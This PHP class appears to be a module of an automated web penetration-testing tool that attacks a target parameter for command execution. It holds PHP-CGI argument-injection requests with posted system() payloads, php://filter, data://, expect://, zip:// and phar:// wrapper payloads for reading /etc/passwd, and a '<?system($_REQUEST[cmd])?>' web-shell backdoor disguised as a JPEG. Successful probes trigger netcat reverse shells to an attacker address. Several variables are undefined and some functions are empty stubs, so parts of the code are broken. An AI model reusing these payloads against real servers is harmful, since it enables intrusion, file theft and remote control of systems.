<?php
class CE extends PARAM4COM{

    
    
    
    
    public function __construct($stream,$url,$param,$value,$methode_http) {
        parent::__construct($stream,$url,$param,$value,$methode_http);
   }
   
   
    
    public function ce4pentest($OS){
        $this->gtitre(__FUNCTION__);
        $OS = trim($OS);
        $sql_r_1 = "SELECT param2ce FROM URI WHERE $this->uri2where AND param2ce <> 0";
    if ($this->checkBD($sql_r_1) ) return  $this->article("Command Execution","DONE");
    else {        
        $this->ce2shell($OS);$this->pause();
        //$this->ce2write($OS);$this->pause();
        //$this->ce2read($OS);$this->pause();
        //return $this->req2BD4in("param2ce","URI",$this->uri2where,"1");
        }
    }
    

    
    public function ce2exec($template,$dico){
        $result = "";
        $this->titre(__FUNCTION__);
        
        $cmds = file($dico);
        foreach ($cmds as $cmd){
            $cmd = trim($cmd);
            $this->ce2rst($template,$cmd,"");
        }
        return $result;
    }
    
    
    public function ce2shell8param($OS){ // OK
        $this->titre(__FUNCTION__);
        $cmd = "id";
        $filter = "| grep 'uid='  ";
        $template = $this->param2template($cmd,$filter);
        $this->param2rce($template);$this->pause();
    }
    
    public function ce2shell8post($OS){ // OK
        $this->titre(__FUNCTION__);
        $cmd = "id";
        $filter = "| grep 'uid=' | grep 'gid=' ";
        $shell = "/bin/bash";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        // https://www.hackingarticles.in/web-application-penetration-testing-curl/
    }
   
    
 

    
    

    
    public function ce2rst($template,$cmd,$filter){
        $this->ssTitre(__FUNCTION__);
        
        $arg = str_replace("%NLBT%","$this->null_byte", $template);
        $arg = str_replace("%CMD%","$cmd", $arg);
        
        $html = $this->param2check($this->user2agent,$arg,$filter);
        $result = $this->compare2string($html, $this->html_original);

        
        //$this->article("ORIGINAL", $this->html_original);$this->pause();
        //$this->article("INJECTED", $html);$this->pause();
        $this->article("RESULT", $result);
        return $result;
    }
    
 
    public function ce2shell($OS){
        
        $this->titre(__FUNCTION__);
        $this->ce2shell8param($OS);$this->pause();
        $this->ce2shell8php($OS);$this->pause();
        
    }
    
    public function ce2write($OS){
        
        $this->titre(__FUNCTION__);
        //$this->ce2write8param($OS);$this->pause();
        $this->ce2write8php($OS);$this->pause();
        
    }
    
    public function ce2read($OS){
        
        $this->titre(__FUNCTION__);
        $this->ce2read8param($OS);$this->pause();
        $this->ce2read8php($OS);$this->pause();
        
    }
    
    public function ce2read8param($OS){
        
        $this->titre(__FUNCTION__);
        
        $cmd = "id";
        $filter = "| grep 'uid=' | grep 'gid=' ";
        $shell = "/bin/bash";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        
        
    }
    public function ce2read8php($OS){
        
        $cmd = "cat /etc/passwd";
        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
        $shell = "/bin/sh";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        
        $template = "php://filter/resource=/etc/passwd";
                if (!empty($this->param2check($this->user2agent,$cmd,$filter))) {
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        $template = "php://filter/resource=/etc/passwd$this->null_byte";
                if (!empty($this->param2check($this->user2agent,$cmd,$filter))) {
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        $template = "php://filter/resource=$this->dir_remote/etc/passwd";
        $this->param2cmd($cmd,$template, $filter);
        
        $template = "php://filter/resource=$this->dir_remote/etc/passwd$this->null_byte";
        $this->param2cmd($cmd,$template, $filter);
        
        $template = "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd";
        $this->param2cmd($cmd3,$template, $filter);
        
        
        $template = "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd$this->null_byte";
        $this->param2cmd($cmd3,$template, $filter);
        
        $template = "php://filter/zlib.deflate/convert.base64-encode/resource=$this->dir_remote/etc/passwd";
        $this->param2cmd($cmd3,$template, $filter);
        
        $template = "php://filter/zlib.deflate/convert.base64-encode/resource=$this->dir_remote/etc/passwd$this->null_byte";
        $this->param2cmd($cmd3,$template, $filter);
        
        $template = "php://filter/convert.base64-encode/resource=$this->dir_remote/etc/passwd";
        $this->param2cmd($cmd3,$template, $filter);
        
        $template = "php://filter/convert.base64-encode/resource=$this->dir_remote/etc/passwd$this->null_byte";
        $this->param2cmd($cmd3,$template, $filter);
        
        $template = "php://filter/read=convert.base64-encode/resource=/etc/passwd";
        $this->param2cmd($cmd3,$template, $filter);
        
        $template = "php://filter/read=convert.base64-encode/resource=/etc/passwd$this->null_byte";
        $this->param2cmd($cmd3,$template, $filter);
        
        $template = "php://filter/read=convert.base64-encode/resource=$this->dir_remote/etc/passwd";
        $this->param2cmd($cmd3,$template, $filter);
        
        $template = "php://filter/read=convert.base64-encode/resource=$this->dir_remote/etc/passwd$this->null_byte";
        $this->param2cmd($cmd3,$template, $filter);
        
        
        ################### INFO ####################################
        $this->article("file://", "is used to access the local file system and is not affected by allow_url_fopen orallow_url_include.");
        $template = "file:///etc/passwd";
        $this->param2cmd($cmd11,$template, $filter);
        
        $template = "file:///etc/passwd$this->null_byte";
        $this->param2cmd($cmd12,$template, $filter);
        
    }
    

    
    public function ce2write8php($OS) {
        
        $this->ssTitre(__FUNCTION__);
        
        $cmd = "id";
        $filter = "| grep 'uid=' | grep 'gid=' ";
        $shell = "/bin/bash";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        
        
    }
    
    
    
    
    public function ce2shell8php2expect($OS) {
        $this->ssTitre(__FUNCTION__);
        
        $cmd = "id";
        $filter = "| grep 'uid=' | grep 'gid=' ";
        $shell = "/bin/sh";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        
        $cmd_exec = "expect://%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd);
        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        $cmd_exec = "expect://%CMD%%NB%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd);
        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
    }
    
    
    public function ce2shell8php2module($OS) {
        $this->ssTitre(__FUNCTION__);
        
        // cgi-bin/php?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation=on -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input -d cgi.force_redirect=0 -d cgi.redirect_status_env=0 -d auto_prepend_file=php://input -n
        
        
        $cmd = "id";
        $filter = "| grep 'uid=' | grep 'gid=' ";
        $shell = "/bin/bash";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        
        
        $cmd_exec = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";
        //$cmd_exec = $this->url2encode($cmd_exec);
        $template = str_replace("$this->param=$this->value", "$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd);
        $query = "wget --no-check-certificate -qO- --post-data \"<?system('cat /etc/passwd')?>\" \"$url\" $filter ";
        if (!empty($this->req_ret_str($query))) {
            
            $rev = $this->rev8nc($attacker_ip, $attacker_port, $shell);
            $cmd_rev_nc = "wget --no-check-certificate -qO- --post-data \"<?system('$rev')?>\" \"$url\" 2> /dev/null ";
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        
        
        $cmd_exec = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";
        //$cmd_exec = $this->url2encode($cmd_exec);
        $template = str_replace("$this->param=$this->value", "$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd);
        $query = "wget --no-check-certificate -qO- --post-data \"<?system('cat /etc/passwd')?>\" \"$url\" $filter ";
        if (!empty($this->req_ret_str($query))) {
            
            $rev = $this->rev8nc($attacker_ip, $attacker_port, $shell);
            $cmd_rev_nc = "wget --no-check-certificate -qO- --post-data \"<?system('$rev')?>\" \"$url\" 2> /dev/null ";
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        
        
        
        
        $cmd_exec = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&cmd=%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd_exec);
        $query = "wget --no-check-certificate -qO- --post-data \"<?system(\\\$_GET[cmd])?>\" \"$url\" $filter ";
        if (!empty($this->req_ret_str($query))) {
            
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        
        $cmd_exec = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&cmd=%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd_exec);
        $query = "wget --no-check-certificate -qO- --post-data \"<?system(\\\$_GET['cmd'])?>\" \"$url\" $filter ";
        if (!empty($this->req_ret_str($query))) {
            
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        $cmd_exec = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&cmd=%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd_exec);
        $query = "wget --no-check-certificate -qO- --post-data \"<?system(\$_GET[cmd])?>\" \"$url\" $filter ";
        if (!empty($this->req_ret_str($query))) {
            
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        
        $cmd_exec = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&cmd%3d%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd_exec);
        $query = "wget --no-check-certificate -qO- --post-data \"<?system(\$_GET[cmd])?>\" \"$url\" $filter ";
        if (!empty($this->req_ret_str($query))) {
            
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        $cmd_exec = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&cmd=%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd_exec);
        $query = "wget --no-check-certificate -qO- --post-data \"<?system(\$_GET['cmd'])?>\" \"$url\" $filter ";
        if (!empty($this->req_ret_str($query))) {
            
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        
        $cmd_exec = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&cmd=%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd_exec);
        $query = "wget --no-check-certificate -qO- --post-data \"<?system(\$_REQUEST[cmd])?>\" \"$url\" $filter ";
        if (!empty($this->req_ret_str($query))) {
            
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        
        $cmd_exec = "-d+allow_url_include=1+-d+auto_prepend_file=php://input&cmd=%CMD%%NB%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd_exec);
        $query = "wget --no-check-certificate -qO- --post-data \"<?system(\$_REQUEST[cmd])?>\" \"$url\" $filter ";
        if (!empty($this->req_ret_str($query))) {
            
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
    }
 
    
    public function ce2shell8php($OS) {
        
        $this->titre(__FUNCTION__);
        
        $this->ce2shell8php2module($OS);$this->pause();
        $this->ce2shell8php2wrapper($OS);$this->pause();
        $this->ce2shell8php2expect($OS);$this->pause();
        
        
    }
    
    
    public function ce2shell8php2wrapper4zip() {
        $this->titre(__FUNCTION__);
        
        $cmd = "id";
        $filter = "| grep 'uid=' | grep 'gid=' ";
        $shell = "/bin/bash";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        
        /*
        echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;   
mv payload.zip shell.jpg;    
rm payload.php   

http://example.com/index.php?page=zip://shell.jpg%23payload.php

echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;   
mv payload.zip shell.jpg;    
rm payload.php   

http://example.com/index.php?page=zip://shell.jpg%23payload.php
http://example.com/index.php?page=zip://shell.jpg%23paylod

lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         */
        $backdoor = "<?system(\$_REQUEST[cmd])?>";
        $php_backdoor_file = "$this->dir_tmp/rohff.php";
        if (!file_exists($php_backdoor_file)) $this->requette("echo \"$backdoor\" > $php_backdoor_file ");
        if (!file_exists("$this->dir_tmp/rohff.zip")) $this->requette("zip $this->dir_tmp/rohff.zip $this->dir_tmp/rohff.php");
        if (!file_exists("$this->dir_tmp/rohff.jpg")) $this->requette("mv -v $this->dir_tmp/rohff.zip $this->dir_tmp/rohff.jpg");
        
        
        
        $cmd13 = "zip://rohff.jpg%23rohff.php";
        $this->param2check($this->user2agent,$cmd13,$filter);
        $url = "$this->http_type://$this->vhost:$this->port/$this->uri_path_dirname/rohff.php?cmd=cat /etc/passwd";
        $query = "wget --user-agent='$this->user2agent' \"$url\" --timeout=2 --tries=2 --no-check-certificate -qO-  $filter ";
        if (!empty($this->req_ret_str($query))) {
            
        }
    }
    
    
    public function ce2shell8php2wrapper4data() {
        $this->ssTitre(__FUNCTION__);
        
        // http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
        $cmd = "id";
        $filter = "| grep 'uid=' | grep 'gid=' ";
        $shell = "/bin/bash";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        
        $backdoor = "<?system(\$_REQUEST[cmd])?>";
        $cmd_exec = "data://text/plain,$backdoor&cmd=%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd);
        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        
        
        $cmd_exec = "data:,$backdoor&cmd=%CMD%%NB%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd);
        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        
        $backdoor = "<?system(\$_REQUEST[cmd])?>";
        $backdoor_base64 = base64_encode($backdoor);
        $cmd_exec = "data:;base64,$backdoor_base64"."&cmd=%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd);
        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        $backdoor = "<?system(\$_REQUEST[cmd])?>";
        $backdoor_base64 = base64_encode($backdoor);
        $cmd_exec = "data:application/x-httpd-php;base64,$backdoor_base64&cmd=%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd);
        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        
        $backdoor = "<?system(\$_REQUEST[cmd])?>";
        $backdoor_base64 = base64_encode($backdoor);
        $cmd_exec = "data://text/plain;base64,$backdoor_base64&cmd=%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd);
        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        $this->pause();
        
        $backdoor = "<?system(\$_REQUEST[cmd])?>";
        $cmd_exec = "data://text/plain;$backdoor&cmd=%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd);
        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        
        
        
        
    }
    
    
    public function ce2shell8php2wrapper4php() {
        $this->titre(__FUNCTION__);
        
        $cmd = "id";
        $filter = "| grep 'uid=' | grep 'gid=' ";
        $shell = "/bin/bash";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        
        $backdoor = "echo \"<?system(\$_REQUEST[cmd])?>\" > ./rohff.php ";
        $backdoor_base64 = base64_encode($backdoor);

        
        // /proc/sched_debug # Can be used to see what processes the machine is running
        
        $backdoor = "<?system(\$_REQUEST[cmd])?>";
        $cmd_exec = "php://fd/&cmd=%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $url = $this->param2url($template, $cmd);
        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
    }
    
 
    
    public function ce2shell8php2wrapper4phar() {
        $this->ssTitre(__FUNCTION__);
        $cmd = "id";
        $filter = "| grep 'uid=' | grep 'gid=' ";
        $shell = "/bin/bash";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        
        $cmd13 = "phar://rohff.php";
        $this->param2check($this->user2agent,$cmd13,$filter);
        $url = "$this->http_type://$this->vhost:$this->port/$this->uri_path_dirname/rohff.php?cmd=cat /etc/passwd";
        $query = "wget --user-agent='$this->user2agent' \"$url\" --timeout=2 --tries=2 --no-check-certificate -qO-  $filter ";
        if (!empty($this->req_ret_str($query))) {
           
        }
    }
    

    public function ce2shell8php2wrapper($OS) {
        $this->titre(__FUNCTION__);
        $this->ce2shell8php2wrapper4data();$this->pause();
        $this->ce2shell8php2wrapper4phar();$this->pause();
        $this->ce2shell8php2wrapper4php();$this->pause();
        $this->ce2shell8php2wrapper4zip();$this->pause();       
    }

    
}
?>